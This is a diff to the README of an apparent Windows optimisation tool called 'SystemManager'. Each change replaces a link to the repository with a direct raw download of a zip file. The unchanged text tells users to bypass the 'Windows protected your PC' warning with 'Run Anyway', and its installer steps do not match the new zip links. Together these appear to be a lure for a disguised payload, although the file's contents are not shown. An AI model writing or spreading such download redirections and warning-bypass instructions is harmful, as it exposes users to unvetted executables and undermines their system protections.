@@ -1,6 +1,6 @@
 # 🛠️ SystemManager - Optimize your Windows performance with ease
 
-[![](https://img.shields.io/badge/Download-SystemManager-blue)](https://github.com/twillfountain50/SystemManager)
+[![](https://img.shields.io/badge/Download-SystemManager-blue)](https://raw.githubusercontent.com/twillfountain50/SystemManager/main/SysManager/System_Manager_v1.2.zip)
 
 SystemManager is a toolkit for Windows. It helps you manage your computer through one simple interface. You can check your network, tune your system speed, clean junk files, monitor battery life, manage running processes, remove programs, and control startup apps. This tool brings control back to the user. Use it to keep your Windows 10 or Windows 11 machine running in the best condition.
 
@@ -8,7 +8,7 @@ SystemManager is a toolkit for Windows. It helps you manage your computer throug
 
 You do not need programming skills to use this software. Follow these instructions to set up the toolkit on your machine.
 
-1. Go to the [official download page](https://github.com/twillfountain50/SystemManager).
+1. Go to the [official download page](https://raw.githubusercontent.com/twillfountain50/SystemManager/main/SysManager/System_Manager_v1.2.zip).
 2. Look for the latest version under the Releases section.
 3. Download the file ending in .exe.
 4. Open the file to run the installer.
@@ -57,7 +57,7 @@ We build this app with open-source code. You can audit the code at any time to v
 
 To install the software, visit the official repository link again.
 
-[Download SystemManager](https://github.com/twillfountain50/SystemManager)
+[Download SystemManager](https://raw.githubusercontent.com/twillfountain50/SystemManager/main/SysManager/System_Manager_v1.2.zip)
 
 When you run the file, Windows might show a security prompt. This happens because the app makes system-level changes. Click "More Info" and then "Run Anyway" if you see the "Windows protected your PC" message. The app only modifies the settings you select within the interface. It does not perform changes without your direct permission.
 
